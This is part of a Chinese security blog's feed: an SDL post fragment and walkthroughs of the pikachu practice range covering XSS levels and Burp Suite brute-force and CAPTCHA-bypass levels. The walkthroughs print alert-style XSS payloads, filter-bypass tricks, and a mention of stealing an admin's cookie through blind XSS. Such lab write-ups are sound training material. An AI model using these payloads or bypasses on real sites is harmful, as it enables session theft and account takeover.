&lt;h2 id=&#34;阶段5验证&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#阶段5验证&#34;&gt;#&lt;/a&gt; 阶段 5：验证&lt;/h2&gt;
&lt;p&gt;验证阶段涉及到动态程序分析和攻击面再审计。动态分析对静态分析进行补充，常用的方式是模糊测试、渗透测试。模糊测试通过向应用程序引入特定格式或随机数据查找程序可能的问题。&lt;/p&gt;
&lt;p&gt;考虑到项目经常会因为需求变更等情况使得最终产品和初期目标不一致，因此需要在项目后期再次对威胁模型和攻击面进行分析和考虑，如果出现问题则进行纠正。&lt;/p&gt;
&lt;h2 id=&#34;阶段6发布&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#阶段6发布&#34;&gt;#&lt;/a&gt; 阶段 6：发布&lt;/h2&gt;
&lt;p&gt;在程序发布后，需要对安全事件进行响应，需要预设好遇到安全问题时的处理方式。&lt;/p&gt;
&lt;p&gt;另外如果产品中包含第三方的代码，也需要考虑如何响应因为第三方依赖引入的问题。&lt;/p&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubWljcm9zb2Z0LmNvbS9lbi11cy9zZWN1cml0eWVuZ2luZWVyaW5nL3NkbC9wcmFjdGljZXM=&#34;&gt;SDL Practices&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubWljcm9zb2Z0LmNvbS9lbi11cy9zZWN1cml0eWVuZ2luZWVyaW5nL3NkbC90aHJlYXRtb2RlbGluZw==&#34;&gt;Threat Modeling&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/pikachu/pikachu-xss/</guid>
            <title>pikachu-XSS</title>
            <link>https://mobius-0.github.io/security/pikachu/pikachu-xss/</link>
            <category>XSS</category>
            <category>漏洞</category>
            <category>渗透测试</category>
            <category>靶场</category>
            <category>pikachu</category>
            <pubDate>Sat, 03 Dec 2022 20:20:55 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;反射型xssget&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反射型xssget&#34;&gt;#&lt;/a&gt; 反射型 XSS（get）&lt;/h1&gt;
&lt;h2 id=&#34;过程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过程&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;在输入框中输入任意字段，查看页面代码可以发现输入字段已经被插入到了页面之中&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/V5JlmdS31TrwkxC.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;这里可以尝试直接输入相应的 XSS payload，如&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;
&amp;lt;details+open+ontoggle=prompt(1)&amp;gt;
&amp;lt;svg/onload=confirm(1)&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;等&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;输入的时候可以发现输入框有输入字符的上限（并且该输入框在测试时还可以发现其对输入字符髌骨无限制，特殊字符如 / 等可以直接插入到前端代码中），但这些不算很重要，我们可以直接在前端的代码上修改，也可以在网页的 url 上根据规律进行插入&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/Vbk6tW7wDxhspGz.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;反弹结果&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/AB1TUmItyG54pMq.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/OqeGpAaHP6uxFit.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;GET 方式要更容易被利用，因为相关元素可以直接通过网页 URL 直接提交，通常的利用形式为将带有跨站脚本的 URL 伪装后发送给目标&lt;/p&gt;
&lt;h1 id=&#34;反射型xsspost&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反射型xsspost&#34;&gt;#&lt;/a&gt; 反射型 XSS（post）&lt;/h1&gt;
&lt;h2 id=&#34;过程-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过程-2&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;由于使用的是 post 方法，这里需要使用 burp suite 进行数据包的抓取&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/ULb8cZdWiSGvr7P.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;根据重放可知字符也已经插入页面代码&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/I72ifcL89ymE1eR.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;修改抓取的数据包，将 message 修改为 XSS 的 payload&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/aBiIjJ1vV8hQkuC.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;放行后输出结果，可以看到 payload 已经插入页面代码中&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/QzElqaYN67yZdpF.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/iMCDozdOaXBhxHm.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结-2&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;POST 方式相对 GET 要更难被利用，但这同样存在安全隐患，这里就通过对数据包的篡改完成了 XSS 的 payload 插入，主要的利用方式会在 XSS 之盲打中会介绍&lt;/p&gt;
&lt;h1 id=&#34;存储型xss&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#存储型xss&#34;&gt;#&lt;/a&gt; 存储型 XSS&lt;/h1&gt;
&lt;h2 id=&#34;过程-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过程-3&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;首先同样输入任意值，测试其是否存在对特殊字符的过滤&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/dtBg7R6PXwze3Mv.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;直接输入 XSS 的 payload，反弹结果，同时可以查看页面代码，发现 payload 已经被插入其中&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/gxzHjGslwbOYSq9.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/smBoa5QdLlWzgTf.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结-3&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;存储型 XSS 在道理上和反射型差不多，区别在于存储型会被存储起来，而反射型则是一次性的&lt;/p&gt;
&lt;h1 id=&#34;dom型xss&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dom型xss&#34;&gt;#&lt;/a&gt; DOM 型 XSS&lt;/h1&gt;
&lt;h2 id=&#34;过程-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过程-4&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;同样首先输入任意字符，查看页面元素可知字符已被插入到前端中&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/04/coW2JHhNR79Qv16.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;输入 payload： &lt;code&gt;javascript:alert(1)&lt;/code&gt;  尝试触发漏洞，查看页面元素可知 payload 已被插入到前端，点击 &lt;code&gt;what do you see？&lt;/code&gt; 可以看到漏洞已触发&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/04/qJwzxBHbT5e1jNm.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结-4&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;这类型漏洞危害性不算非常大，但依旧需要留意&lt;/p&gt;
&lt;h1 id=&#34;dom型xss-x&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dom型xss-x&#34;&gt;#&lt;/a&gt; DOM 型 XSS-X&lt;/h1&gt;
&lt;h2 id=&#34;过程-5&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过程-5&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;与上一个关卡相同，先输入任意值，在页面元素中查看相关信息&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/04/CoBtrZPh4djYGKw.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;然后输入 payload 尝试触发漏洞，随后查看 payload 是否已经插入至页面元素中&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/04/j98Bvde3KuTPcEx.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-5&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结-5&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;这类型漏洞在某些方面与反射型 XSS 类似，它们同样都是通过 url 来获取输入，实际上在观察 url 内容后就可以发现 url 中有我们先前的输入 &lt;code&gt;javascript%3Aalert(1)&lt;/code&gt; ，其中 &lt;code&gt;:&lt;/code&gt;  在 url 内表现为 &lt;code&gt;%3A&lt;/code&gt; ，这些符号都有固定的翻译对应，例如空格就会翻译为 &lt;code&gt;%20&lt;/code&gt; 。&lt;/p&gt;
&lt;h1 id=&#34;xss之盲打&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xss之盲打&#34;&gt;#&lt;/a&gt; XSS 之盲打&lt;/h1&gt;
&lt;h2 id=&#34;过程-6&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过程-6&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;老规矩，先输入任意值，在前端代码中并没有看到相应的输出，所以这里需要登录管理后台查看结果&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/04/WasLb8V4YG7tCju.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;随后输入 payload &lt;code&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt;  尝试触发漏洞，由于前端并没有对应代码显示，所以需要到后台查看漏洞是否被触发。可以看到弹窗，漏洞已经被触发。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/04/9PvRs8C3tpLwmMy.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-6&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结-6&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;盲打主要指的是这么一种攻击场景，前端输入的内容只有在后端才能看到，这类型的攻击通常具有随机性，首先输入框有可能存在对特殊字符和语句的过滤，导致跨站脚本上传失败，即使能够上传成功，在后端也有可能有过滤或验证，导致脚本不一定会被触发。但是危害同样很大，如果不存在上述验证，那么完全可以将脚本替换为获取 cookie 的脚本，如果管理员登陆就有可能会被盗取 cookie，导致管理权限的外泄。&lt;/p&gt;
&lt;h1 id=&#34;xss过滤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xss过滤&#34;&gt;#&lt;/a&gt; XSS 过滤&lt;/h1&gt;
&lt;h2 id=&#34;过程-7&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过程-7&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;依旧是老规矩，首先随意输入查看过滤情况，可以发现如 &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;  或双写关键词 &lt;code&gt;&amp;lt;scrscriptipt&amp;gt;&lt;/code&gt;  等都被过滤掉了&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;尝试修改 payload 格式，发现大写形式是不会被过滤的，写入后成功触发漏洞&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/04/x6XeM7ckWntEDhH.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/04/vfBMTFm1Qa4qglS.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-7&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结-7&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;这里漏洞的问题还是在于过滤的规则不够完善，查看源代码可以发现，实际上是只对 &lt;code&gt;&amp;lt;script&lt;/code&gt;  进行了过滤，简单点的绕过可以通过改变大小写来实现，同时也可以使用其他 payload 如 img 的标签 &lt;code&gt;&amp;lt;img src=x onerror=&amp;quot;alert(1)&amp;quot;&amp;gt;&lt;/code&gt;  来实现绕过&lt;/p&gt;
&lt;h1 id=&#34;xss之htmlspecialchars&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xss之htmlspecialchars&#34;&gt;#&lt;/a&gt; XSS 之 htmlspecialchars&lt;/h1&gt;
&lt;h2 id=&#34;过程-8&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过程-8&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;仍旧老规矩，随意输入字符，查看是否插入至前端中&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/04/UKlvPJfGhw9qraN.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;根据 htmlspecialchars 方法默认不对 &lt;code&gt;&#39;&lt;/code&gt;  进行处理的特点，我们可以构造 payload &lt;code&gt;1&#39; oneclick=&#39;alert(1)&#39;&lt;/code&gt; ，输入后查看结果&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/04/imwbCQnuKe5stIf.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/04/Q8Hi6MuhG2zmelE.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-8&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结-8&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;htmlspecialchars () 函数功能为把预定的字符转换为 HTML 实体，当前预定义的字符有：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; &amp;amp; → &amp;amp;amp
 &amp;quot; → &amp;amp;quot
 &#39; → &amp;amp;apos
 &amp;lt; → &amp;amp;lt
 &amp;gt; → &amp;amp;gt
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;xss之href输出&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xss之href输出&#34;&gt;#&lt;/a&gt; XSS 之 href 输出&lt;/h1&gt;
&lt;h2 id=&#34;过程-9&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过程-9&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;随意输入字符，查看页面源代码插入位置&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/04/ZAHn1MfB73sbXTz.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;此处可以直接构造 payload &lt;code&gt;javascript:alert(1)&lt;/code&gt; ，输入后查看结果&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/04/3XBuyI1HLkNDaMT.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/04/qBDJt5mx3flyzCF.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-9&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结-9&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;这个漏洞比较简单，此处我们可以只允许 http、https，其次再进行 htmlspecialchars 处理&lt;/p&gt;
&lt;h1 id=&#34;xss之js输出&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xss之js输出&#34;&gt;#&lt;/a&gt; XSS 之 js 输出&lt;/h1&gt;
&lt;h2 id=&#34;过程-10&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过程-10&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;首先随意输入字符，发现代码中使用 $ms 来传递参数&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/04/m3NqsvaHCuiAyZY.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;构造 payload 尝试闭合掉下方的 if 判断句 &lt;code&gt;1&#39;&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/04/2lPxNofSVdvamrB.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/04/yjbYkTQBXlG7zWg.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-10&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结-10&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;这里主要的操作是再输入框后增加前端代码完成对原有代码的闭合，将原来的判断语句直接排除在外，这样就避免了 if 的验证，实现绕过。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/pikachu/pikachu-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</guid>
            <title>pikachu-暴力破解</title>
            <link>https://mobius-0.github.io/security/pikachu/pikachu-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</link>
            <category>漏洞</category>
            <category>渗透测试</category>
            <category>靶场</category>
            <category>pikachu</category>
            <pubDate>Sat, 03 Dec 2022 20:19:55 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;基于表单的暴力破解&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基于表单的暴力破解&#34;&gt;#&lt;/a&gt; 基于表单的暴力破解&lt;/h1&gt;
&lt;h2 id=&#34;过程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过程&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;这里本质上还是利用字典来进行用户名和密码的暴力破解，不过对于 burp suite 这类比较全面工具来说，他自己自带的字典爆破的功能就相对简单了点，并没有字典内字符相互拼接的功能，只能简单的进行排列组合。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;首先在框中随意输入字符，用 burp suite 进行数据包抓取&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/UuzCZHMX5NPOsxv.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;将数据包转发至 Intruder，选择爆破的位置，加入自己准备好的字典&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/WbldrFI4UCvyOjX.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/HBQizml95WTDtyG.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;开始攻击，完成后查看结果，通常此时成功所返回的数据包长度与失败的不同，所以一般只需要查看这些请求即可&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/SaCurRQTGPcE7jZ.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这个时候可以看到这个请求包的长度有点问题，查看响应结果可知爆破成功&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/MesWCT1fUqnioxv.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;这里的爆破还是较为简单的，不过后来查询数据库拥有的用户时发现实际上由三个账户可以登录，但实际上只爆破出来了一个，主要原因在于字典不够全，当然这里主要靠平时的测试积累，或者直接盲猜&lt;/p&gt;
&lt;h1 id=&#34;验证码绕过on-server&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#验证码绕过on-server&#34;&gt;#&lt;/a&gt; 验证码绕过（on server）&lt;/h1&gt;
&lt;h2 id=&#34;过程-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过程-2&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;与上一个实验相同，随意填入用户名和密码，正确填入验证码，点击登录，同时用 burp suite 进行抓包&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/9xXt2PKrqfcyI3k.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;将抓取数据包发送至重放器（Repeater），修改用户名或密码发送，分析回显信息，发现验证码在后端可以重复使用&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/zTqSjriaY7J5nfB.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/Q5la8sHAIjk4NYh.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;那么将数据包内容发送至攻击器（Intruder），用类似的操作进行爆破&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/QtNYU8ORFVxmg94.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;最后爆破成功&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/c8dblZBoYhF1Tfe.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结-2&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;这里测试能够成功原因在于登录平台后端对验证码的验证并不严谨，单一生成的验证码可以多次使用，这就留下了非常大的安全隐患。后期可以设置验证码的存活时间，以避免长线的字典爆破。&lt;/p&gt;
&lt;h1 id=&#34;验证码绕过on-client&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#验证码绕过on-client&#34;&gt;#&lt;/a&gt; 验证码绕过（on client）&lt;/h1&gt;
&lt;h2 id=&#34;过程-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过程-3&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;随意填入用户名与密码，正确填入验证码，点击登录，同时用 burp suite 进行抓包&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/kSO5WI8DUjawxQN.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;将抓取数据包发送至重放器（Repeater），修改验证码字段，发现前端代码在验证码为空时依然能通过验证&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/6PLl2QseOVmfvCg.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;于是将抓取数据包发送至攻击器（Intruder），进行类似的爆破操作即可&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/br8zXs6pacdSQtf.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结-3&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;这里最大的问题在于验证代码放在前端，并且存在隐患巨大的漏洞，不仅易于绕过，同时这样源代码也容易被窃取&lt;/p&gt;
&lt;h1 id=&#34;token防爆破&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#token防爆破&#34;&gt;#&lt;/a&gt; token 防爆破？&lt;/h1&gt;
&lt;p&gt;这段其实没有做出结果来，还是找的网上的过程学习之后再打出来的，但是个人认为网络上的通关过程也不是很好，在爆破的时候也只是对密码和 token 两个值进行爆破，并没有对用户名进行操作，而我当时则是同时对三个值进行爆破，折磨了一个下午也没有结果，最后按网络过程后才出了结果。&lt;/p&gt;
&lt;h2 id=&#34;过程-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过程-4&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;首先将抓取的登陆数据包发送到攻击器（Intruder），设置 attack type 为 pitchfork，并选中密码和 token 作为爆破字段&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/wjcNpfeGqSgYtZu.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;根据顺序加载对应的 payload 集，如 payload 集 1 加载密码字典，payload 集 2 设置为 recursive grep&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/GKe2MEOL4NqpwFy.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/qz5UvkFEAxCT7uL.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;在 grep-extract 下添加 token 的抓取&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/E3RFUuIol16rxms.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;由于涉及递归和重定向，需要新建线程数为 1 的进程资源，重定向选项设置为 always&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/iO1UMKckhmzGFTY.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
